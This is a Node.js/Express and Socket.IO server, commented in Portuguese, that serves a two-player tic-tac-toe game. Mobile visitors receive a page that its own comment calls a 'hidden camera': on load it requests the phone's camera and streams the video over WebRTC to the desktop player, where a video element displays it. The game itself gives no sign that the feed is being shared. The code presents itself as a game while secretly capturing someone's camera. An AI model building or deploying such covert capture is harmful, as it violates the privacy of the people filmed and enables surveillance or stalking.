const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*" }
});

const PORT = process.env.PORT || 3000;

console.log('🚀 INICIANDO SERVIDOR...');

// Rota única - detecta dispositivo
app.get('/', (req, res) => {
  console.log('📱 Nova requisição GET /');
  console.log('   User-Agent:', req.headers['user-agent']);
  
  const ua = req.headers['user-agent'].toLowerCase();
  const isMobile = ua.includes('mobile') || ua.includes('android') || ua.includes('iphone');
  
  console.log('   Dispositivo:', isMobile ? 'CELULAR' : 'PC');
  
  if (isMobile) {
    // CELULAR: jogo + câmera oculta
    res.send(`<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Jogo - Celular</title>
    <style>
        body { font-family: Arial; background: #1a1a1a; color: white; text-align: center; padding: 20px; }
        .board { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; max-width: 300px; margin: 20px auto; }
        .cell { background: #333; border: 2px solid #4CAF50; aspect-ratio: 1; display: flex; align-items: center; justify-content: center; font-size: 48px; cursor: pointer; }
        .log { background: #000; color: #0f0; text-align: left; padding: 10px; margin-top: 20px; height: 200px; overflow: auto; font-size: 12px; font-family: monospace; }
        button { padding: 15px 30px; background: #4CAF50; color: white; border: none; border-radius: 5px; font-size: 18px; width: 100%; }
    </style>
</head>
<body>
    <h1>📱 CELULAR</h1>
    <div id="status">Aguardando...</div>
    <div class="board" id="board"></div>
    <button onclick="reiniciar()">Reiniciar</button>
    <div class="log" id="log">=== LOGS ===</div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let minhaVez = false;
        let logDiv = document.getElementById('log');
        
        function addLog(msg) {
            logDiv.innerHTML += '<br>' + new Date().toLocaleTimeString() + ': ' + msg;
            logDiv.scrollTop = logDiv.scrollHeight;
            console.log(msg);
        }
        
        addLog('Página carregada');
        
        // Tabuleiro
        for(let i=0; i<9; i++){
            let cell = document.createElement('div');
            cell.className = 'cell';
            cell.id = 'cell-' + i;
            cell.onclick = () => { 
                addLog('Clicou na célula ' + i + ', minhaVez=' + minhaVez);
                if(minhaVez) {
                    addLog('Enviando jogada pos=' + i);
                    socket.emit('jogada', i);
                }
            };
            document.getElementById('board').appendChild(cell);
        }
        addLog('Tabuleiro criado');
        
        // CÂMERA
        addLog('Iniciando câmera...');
        async function camera() {
            try {
                addLog('Solicitando permissão de câmera...');
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                addLog('✅ Câmera OK!');
                
                const peer = new RTCPeerConnection();
                addLog('PeerConnection criada');
                
                stream.getTracks().forEach(t => {
                    peer.addTrack(t, stream);
                    addLog('Track adicionada: ' + t.kind);
                });
                
                peer.onicecandidate = e => { 
                    if(e.candidate) {
                        addLog('ICE candidate gerado');
                        socket.emit('candidate', e.candidate);
                    }
                };
                
                peer.onnegotiationneeded = async () => {
                    addLog('Negociação necessária, criando offer...');
                    const offer = await peer.createOffer();
                    await peer.setLocalDescription(offer);
                    addLog('Offer criada, enviando...');
                    socket.emit('offer', offer);
                };
                
                socket.on('answer', async a => { 
                    addLog('Answer recebido!');
                    await peer.setRemoteDescription(a);
                });
                
                socket.on('candidate', async c => { 
                    addLog('ICE candidate recebido');
                    try{await peer.addIceCandidate(c)} catch(e){addLog('Erro ICE: '+e)} 
                });
                
            } catch(e) {
                addLog('❌ ERRO CÂMERA: ' + e.message);
            }
        }
        camera();
        
        socket.on('connect', () => addLog('Socket conectado! ID: ' + socket.id));
        socket.on('disconnect', () => addLog('Socket desconectado!'));
        socket.on('connect_error', (err) => addLog('Erro conexão: ' + err.message));
        
        socket.on('inicio', d => { 
            addLog('Evento INICIO: ' + JSON.stringify(d));
            minhaVez = d.vez === 'O';
            document.getElementById('status').innerHTML = minhaVez ? 'Sua vez (O)' : 'Vez do PC (X)';
        });
        
        socket.on('jogada', d => {
            addLog('Evento JOGADA: ' + JSON.stringify(d));
            let cell = document.getElementById('cell-' + d.pos);
            if(cell) {
                cell.innerHTML = d.simbolo;
                addLog('Célula ' + d.pos + ' atualizada para ' + d.simbolo);
            }
            minhaVez = !minhaVez;
            document.getElementById('status').innerHTML = minhaVez ? 'Sua vez' : 'Vez do PC';
        });
        
        socket.on('fim', d => {
            addLog('Evento FIM: ' + d.msg);
            document.getElementById('status').innerHTML = d.msg;
        });
        
        socket.on('reiniciar', () => {
            addLog('Evento REINICIAR');
            document.querySelectorAll('.cell').forEach(c => c.innerHTML = '');
            minhaVez = false;
        });
        
        function reiniciar() { 
            addLog('Botão reiniciar clicado');
            socket.emit('reiniciar'); 
        }
    </script>
</body>
</html>`);
  } else {
    // PC: jogo + vídeo
    res.send(`<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Jogo - PC</title>
    <style>
        body { font-family: Arial; background: #1a1a1a; color: white; padding: 20px; }
        .container { display: grid; grid-template-columns: 1fr 1fr; gap: 30px; max-width: 1000px; margin: 0 auto; }
        video { width: 100%; background: black; border-radius: 10px; min-height: 200px; }
        .board { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin: 20px 0; }
        .cell { background: #333; border: 2px solid #4CAF50; aspect-ratio: 1; display: flex; align-items: center; justify-content: center; font-size: 48px; cursor: pointer; }
        .log { background: #000; color: #0f0; text-align: left; padding: 10px; margin-top: 20px; height: 200px; overflow: auto; font-size: 12px; font-family: monospace; }
        button { padding: 10px 20px; background: #4CAF50; color: white; border: none; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <div>
            <video id="video" autoplay playsinline></video>
        </div>
        <div>
            <h1>💻 PC</h1>
            <div id="status">Aguardando...</div>
            <div class="board" id="board"></div>
            <button onclick="reiniciar()">Reiniciar</button>
        </div>
    </div>
    <div class="log" id="log">=== LOGS ===</div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let minhaVez = true;
        let logDiv = document.getElementById('log');
        
        function addLog(msg) {
            logDiv.innerHTML += '<br>' + new Date().toLocaleTimeString() + ': ' + msg;
            logDiv.scrollTop = logDiv.scrollHeight;
            console.log(msg);
        }
        
        addLog('Página carregada');
        
        for(let i=0; i<9; i++){
            let cell = document.createElement('div');
            cell.className = 'cell';
            cell.id = 'cell-' + i;
            cell.onclick = () => { 
                addLog('Clicou na célula ' + i + ', minhaVez=' + minhaVez);
                if(minhaVez) {
                    addLog('Enviando jogada pos=' + i);
                    socket.emit('jogada', i);
                }
            };
            document.getElementById('board').appendChild(cell);
        }
        addLog('Tabuleiro criado');
        
        const peer = new RTCPeerConnection();
        const video = document.getElementById('video');
        addLog('PeerConnection criada');
        
        peer.ontrack = e => {
            addLog('📹 TRACK RECEBIDA! Streams: ' + e.streams.length);
            video.srcObject = e.streams[0];
            addLog('✅ Vídeo conectado!');
        };
        
        peer.onicecandidate = e => { 
            if(e.candidate) {
                addLog('ICE candidate gerado');
                socket.emit('candidate', e.candidate);
            }
        };
        
        socket.on('offer', async o => {
            addLog('📨 OFFER recebida');
            await peer.setRemoteDescription(o);
            addLog('SetRemoteDescription OK');
            const a = await peer.createAnswer();
            addLog('Answer criada');
            await peer.setLocalDescription(a);
            addLog('SetLocalDescription OK');
            socket.emit('answer', a);
            addLog('Answer enviada');
        });
        
        socket.on('candidate', async c => { 
            addLog('📨 CANDIDATE recebido');
            try{ 
                await peer.addIceCandidate(c);
                addLog('ICE candidate adicionado');
            } catch(e){ addLog('Erro ICE: '+e); } 
        });
        
        socket.on('connect', () => addLog('Socket conectado! ID: ' + socket.id));
        socket.on('disconnect', () => addLog('Socket desconectado!'));
        
        socket.on('inicio', () => {
            addLog('Evento INICIO');
            document.getElementById('status').innerHTML = 'Sua vez (X)';
        });
        
        socket.on('jogada', d => {
            addLog('Evento JOGADA: ' + JSON.stringify(d));
            let cell = document.getElementById('cell-' + d.pos);
            if(cell) {
                cell.innerHTML = d.simbolo;
                addLog('Célula ' + d.pos + ' atualizada');
            }
            minhaVez = !minhaVez;
            document.getElementById('status').innerHTML = minhaVez ? 'Sua vez' : 'Vez do celular';
        });
        
        socket.on('fim', d => {
            addLog('Evento FIM: ' + d.msg);
            document.getElementById('status').innerHTML = d.msg;
        });
        
        socket.on('reiniciar', () => {
            addLog('Evento REINICIAR');
            document.querySelectorAll('.cell').forEach(c => c.innerHTML = '');
            minhaVez = true;
        });
        
        function reiniciar() { 
            addLog('Botão reiniciar clicado');
            socket.emit('reiniciar'); 
        }
    </script>
</body>
</html>`);
  }
});

// Jogo
let board = ['','','','','','','','',''];
let vez = 'X';
let pc = null, mobile = null;

console.log('📊 Estado inicial do jogo:');
console.log('   board:', board);
console.log('   vez:', vez);
console.log('   pc:', pc);
console.log('   mobile:', mobile);

function winner() {
  const lines = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
  for(let l of lines) {
    if(board[l[0]] && board[l[0]] == board[l[1]] && board[l[0]] == board[l[2]]) {
      console.log('🏆 VENCEDOR ENCONTRADO:', board[l[0]]);
      return board[l[0]];
    }
  }
  return null;
}

io.on('connection', (s) => {
  console.log('\n🔵 NOVO CLIENTE CONECTADO:', s.id);
  console.log('   Horário:', new Date().toLocaleTimeString());
  
  // Atribuir jogadores
  if(!pc) { 
    pc = s.id; 
    console.log('   ➡️ Definido como PC');
    s.emit('inicio', {vez:'X'});
    console.log('   📤 Enviado evento INICIO para PC');
  } else if(!mobile) { 
    mobile = s.id; 
    console.log('   ➡️ Definido como CELULAR');
    s.emit('inicio', {vez:'O'});
    console.log('   📤 Enviado evento INICIO para CELULAR');
  } else {
    console.log('   ⚠️ Jogo cheio, ignorando');
  }
  
  // WebRTC
  s.on('offer', (o) => {
    console.log('📨 OFFER de', s.id, '-> broadcast');
    s.broadcast.emit('offer', o);
  });
  
  s.on('answer', (a) => {
    console.log('📨 ANSWER de', s.id, '-> broadcast');
    s.broadcast.emit('answer', a);
  });
  
  s.on('candidate', (c) => {
    console.log('📨 CANDIDATE de', s.id, '-> broadcast');
    s.broadcast.emit('candidate', c);
  });
  
  s.on('jogada', (pos) => {
    let jogador = s.id == pc ? 'X' : 'O';
    console.log('\n🎮 JOGADA recebida:');
    console.log('   Socket:', s.id);
    console.log('   Jogador:', jogador);
    console.log('   Posição:', pos);
    console.log('   Vez atual:', vez);
    console.log('   Board:', board);
    
    if(jogador != vez) {
      console.log('   ⚠️ Não é a vez do jogador');
      return;
    }
    if(board[pos] != '') {
      console.log('   ⚠️ Posição já ocupada');
      return;
    }
    
    board[pos] = jogador;
    console.log('   ✅ Board atualizado:', board);
    
    let w = winner();
    
    if(w) {
      console.log('   🏆 TEMOS VENCEDOR:', w);
      io.emit('fim', {msg: w+' venceu!'});
    } else if(!board.includes('')) {
      console.log('   🤝 EMPATE');
      io.emit('fim', {msg:'Empate!'});
    } else {
      vez = vez == 'X' ? 'O' : 'X';
      console.log('   🔄 Próximo jogador:', vez);
    }
    
    console.log('   📤 Enviando evento JOGADA para todos');
    io.emit('jogada', {pos, simbolo:jogador});
  });
  
  s.on('reiniciar', () => {
    console.log('\n🔄 REINICIAR recebido de', s.id);
    board = ['','','','','','','','',''];
    vez = 'X';
    console.log('   Board resetado:', board);
    console.log('   Vez resetada:', vez);
    io.emit('reiniciar');
  });
  
  s.on('disconnect', () => {
    console.log('\n🔴 CLIENTE DESCONECTADO:', s.id);
    if(s.id == pc) { 
      pc = null; 
      console.log('   PC desconectado');
    }
    if(s.id == mobile) { 
      mobile = null; 
      console.log('   CELULAR desconectado');
    }
    board = ['','','','','','','','',''];
    vez = 'X';
    console.log('   Board resetado');
  });
});

server.listen(PORT, '0.0.0.0', () => {
  console.log('\n✅ SERVIDOR RODANDO!');
  console.log('   Porta:', PORT);
  console.log('   URL: http://localhost:' + PORT);
});
